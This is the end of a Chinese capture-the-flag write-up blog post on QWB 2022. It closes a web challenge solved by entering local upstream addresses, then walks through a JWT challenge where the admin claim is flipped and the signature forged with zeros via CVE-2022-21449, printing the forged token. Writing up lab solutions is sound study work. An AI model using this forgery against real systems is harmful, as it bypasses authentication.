+<span class="line" data-line="65"><span style="color:#6A737D">    #    deny  all;</span></span>
+<span class="line" data-line="66"><span style="color:#6A737D">    #}</span></span>
+<span class="line" data-line="67"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p>文件总共都提到了仨地址，直接都填上，然后 <code>权重</code> 的话，根据多年建站经验来说，数值越低，优先级越高，我们直接都设置为 <code>0</code> ,或者相同数，然后让这仨冲突去吧。</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>127.0.0.1</span></span>
+<span class="line" data-line="2"><span>127.0.0.1:8088</span></span>
+<span class="line" data-line="3"><span>127.0.0.1:900</span></span></code></pre>
+<p>静待十几秒，页面返回了 <code>flag</code> ，同时控制台里可以看到请求的接口 <code>504</code> 超时了</p>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220731205149323.png" alt="image-20220731205149323"></p>
+<h2 id="crypto">Crypto</h2>
+<h3 id="myjwt">myJWT</h3>
+<p><code>nc</code> 连接后输入用户名，然后输入 <code>1</code>  获得 <code>generate token</code>，返回一段 <code>JWT</code>，然后输入 <code>2</code> 去 <code>getflag</code> 提示输入 <code>your token</code> 后返回 <code>You are not the administrator.</code>，我们直接解密 <code>JWT</code> 看看</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjpmYWxzZSwiZXhwIjoxNjU5MzM4MTIxNzAwfQ==.5IQnppqB0_rC4OOaCowkLXVYW6eJ1kI6P-IR3dXll0gDYFjQKyOrHbVp10Hrm3GFh8eRBVZok9_z1rrKUQcJUBqQs-PeZElzqrZwE4rPVxJr2fngi2u97HdG4ItmvWiS</span></span></code></pre>
+<p>很明显看到一个权限校验字段 <code>"admin": false,</code></p>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220801151628842.png" alt="image-20220801151528922"></p>
+<p>我们先 <code>base64</code> 解码后把 <code>false</code> 改为 <code>true</code>，重新编码为 <code>base64</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjpmYWxzZSwiZXhwIjoxNjU5MzM4MTIxNzAwfQ==</span></span>
+<span class="line" data-line="2"><span>{"iss":"qwb","name":"iami233","admin":false,"exp":1659338121700}</span></span>
+<span class="line" data-line="3"><span>{"iss":"qwb","name":"iami233","admin":true,"exp":1659338121700}</span></span>
+<span class="line" data-line="4"><span>eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjp0cnVlLCJleHAiOjE2NTkzMzgxMjE3MDB9</span></span></code></pre>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220801151528922.png" alt="image-20220801151528922"></p>
+<blockquote>
+<p>CVE-2022-21449：传入sig值对(r, s)为(0, 0)时，可以绕过验证</p>
+</blockquote>
+<p>最后一段数据我们用 <code>0</code> 填充，原数据是 <code>128</code> 位，我们也用<code>128</code> 个 <code>A</code> 填充</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjp0cnVlLCJleHAiOjE2NTkzMzgxMjE3MDB9.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span></code></pre>
+<p>注意 <code>token</code> 失效时间有点快，所以整体做的时候速度快一点，当然也可以用脚本实现自动化</p>
+<p><img src="https://img.5ime.cn/qwb2022/image-20220801151506983.png" alt="image-20220801151506983"></p>   </section> <footer class="mt-12 pt-8 border-t border-gray-200 dark:border-gray-700"> <div class="bg-gray-50 dark:bg-gray-800 p-6 rounded-lg text-sm text-gray-700 dark:text-gray-300 space-y-2 relative overflow-hidden transition-colors duration-300">  <svg class="absolute -top-11 -right-8 w-40 h-40 opacity-10 pointer-events-none text-gray-600 dark:text-gray-400" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" aria-hidden="true"> <path fill="currentColor" d="M245.8 214.9l-33.2 17.3c-9.4-19.6-25.2-20-27.4-20-22.2 0-33.3 14.6-33.3 43.9 0 23.5 9.2 43.8 33.3 43.8 14.4 0 24.6-7 30.5-21.3l30.6 15.5a73.2 73.2 0 01-65.1 39c-22.6 0-74-10.3-74-77 0-58.7 43-77 72.6-77 30.8-.1 52.7 11.9 66 35.8zm143 0l-32.7 17.3c-9.5-19.8-25.7-20-27.9-20-22.1 0-33.2 14.6-33.2 43.9 0 23.5 9.2 43.8 33.2 43.8 14.5 0 24.7-7 30.5-21.3l31 15.5c-2 3.8-21.3 39-65 39-22.7 0-74-9.9-74-77 0-58.7 43-77 72.6-77C354 179 376 191 389 214.8zM247.7 8C104.7 8 0 123 0 256c0 138.4 113.6 248 247.6 248C377.5 504 496 403 496 256 496 118 389.4 8 247.6 8zm.8 450.8c-112.5 0-203.7-93-203.7-202.8 0-105.5 85.5-203.3 203.8-203.3A201.7 201.7 0 01451.3 256c0 121.7-99.7 202.9-202.9 202.9z"></path> </svg>  <div class="relative z-10 space-y-2"> <div> <strong>本文作者：</strong> <span>iami233</span> </div> <div> <strong>本文链接：</strong> <a href="https://5ime.cn/qwb-2022/index.html" target="_blank" rel="noopener" class="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300 break-all transition-colors duration-300"> https://5ime.cn/qwb-2022/index.html </a> </div> <div> <strong>版权声明：</strong> <span>本文采用 </span> <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/cn/" target="_blank" rel="noopener noreferrer" class="text-blue-600 dark:text-blue-400 hover:text-blue-800 dark:hover:text-blue-300 transition-colors duration-300">
+CC BY-NC-SA 4.0 CN
+</a> <span> 协议进行许可</span> </div> </div> </div> </footer> <div id="waline" class="transition-colors duration-300"></div> <script type="module" src="/_astro/Comment.astro_astro_type_script_index_0_lang.DMKo1lxI.js"></script>  </div> <div id="custom-lightbox" class="lightbox" style="display: none;" data-astro-cid-vqtgpguw>  <div id="lightbox-images" data-astro-cid-vqtgpguw></div> <div class="toolbar" data-astro-cid-vqtgpguw> <div class="counter" data-astro-cid-vqtgpguw> <span data-astro-cid-vqtgpguw><b id="current" data-astro-cid-vqtgpguw>1</b>/<span id="total" data-astro-cid-vqtgpguw>0</span></span> </div> <div class="nav" data-astro-cid-vqtgpguw> <div class="btn" id="prev" data-astro-cid-vqtgpguw> <svg width="20" height="20" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M31 36L19 24L31 12" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> <div class="btn" id="next" data-astro-cid-vqtgpguw> <svg width="20" height="20" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M19 12L31 24L19 36" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> </div> <div class="btn" id="close" data-astro-cid-vqtgpguw> <svg width="16" height="16" viewBox="0 0 48 48" fill="none" data-astro-cid-vqtgpguw> <path d="M8 8L40 40M8 40L40 8" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" data-astro-cid-vqtgpguw></path> </svg> </div> </div> </div> <script type="module">class o{index=0;images=[];elements;constructor(){this.elements={lightbox:document.getElementById("custom-lightbox"),container:document.getElementById("lightbox-images"),prev:document.getElementById("prev"),next:document.getElementById("next"),close:document.getElementById("close"),current:document.getElementById("current"),total:document.getElementById("total")},this.init()}init(){this.elements.prev.onclick=()=>this.navigate(-1),this.elements.next.onclick=()=>this.navigate(1),this.elements.close.onclick=()=>this.close(),this.elements.lightbox.onclick=e=>{e.target===this.elements.lightbox&&this.close()},document.onkeydown=e=>{this.elements.lightbox.style.display==="flex"&&(e.key==="ArrowLeft"?this.navigate(-1):e.key==="ArrowRight"?this.navigate(1):e.key==="Escape"&&this.close())}}open(e,t=0){this.images=e,this.index=t,this.render(),this.elements.lightbox.style.display="flex",this.elements.lightbox.classList.remove("exit"),document.body.style.overflow="hidden"}navigate(e){const t=this.index+e;t>=0&&t<this.images.length&&(this.index=t,this.render())}render(){const{src:e,alt:t}=this.images[this.index],i=new Image;i.onload=()=>{this.elements.container.innerHTML=`<img src="${e}" alt="${t}">`;const s=this.elements.container.querySelector("img");if(window.innerWidth>768){const n=window.innerWidth*.8,l=window.innerHeight*.75;(i.naturalWidth>n||i.naturalHeight>l)&&(s.style.maxWidth=`${n}px`,s.style.maxHeight=`${l}px`)}requestAnimationFrame(()=>s.classList.add("show"))},i.src=e,this.elements.current.textContent=(this.index+1).toString(),this.elements.total.textContent=this.images.length.toString(),this.elements.prev.style.opacity=this.index===0?"0.3":"1",this.elements.next.style.opacity=this.index===this.images.length-1?"0.3":"1"}close(){this.elements.lightbox.classList.add("exit"),document.body.style.overflow="",setTimeout(()=>this.elements.lightbox.style.display="none",300)}}window.customLightbox=new o;</script> </article> </main> <footer class="py-8 px-4 pb-12 text-center text-gray-700 dark:text-gray-400" role="contentinfo" aria-label="网站页脚"> <p>&copy; 2026 iami233. All rights reserved.</p> </footer> <!-- Google Analytics --> <script async src="https://www.googletagmanager.com/gtag/js?id=G-8Z68BHM5GN"></script> <script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-8Z68BHM5GN');
+</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const e=document.getElementById("article");if(e&&window.customLightbox){const n=e.getElementsByTagName("img"),o=[];Array.from(n).forEach((t,a)=>{t.alt||(t.alt=`文章配图 ${a+1}`),o.push({src:t.src,alt:t.alt}),t.style.cursor="pointer",t.addEventListener("click",()=>{window.customLightbox.open(o,a)})})}});</script> <script type="module">document.addEventListener("DOMContentLoaded",()=>{const o=document.querySelectorAll("[data-live-photo]");if(!o.length)return;const e=()=>{o.forEach(t=>{t.setAttribute("data-live-photo-initialized","true")})},i=()=>{const{LivePhotosKit:t}=window;try{t?.Player?.initialize()}catch(n){console.error("LivePhotosKit 初始化失败:",n)}e()};if(window.LivePhotosKit)i();else{const t=document.createElement("script");Object.assign(t,{src:"https://cdn.apple-livephotoskit.com/lpk/1/livephotoskit.js",async:!0,crossOrigin:"anonymous",onerror:()=>{console.error("LivePhotosKit 脚本加载失败"),e()},onload:()=>setTimeout(i,100)}),document.head.appendChild(t)}});</script></body></html>
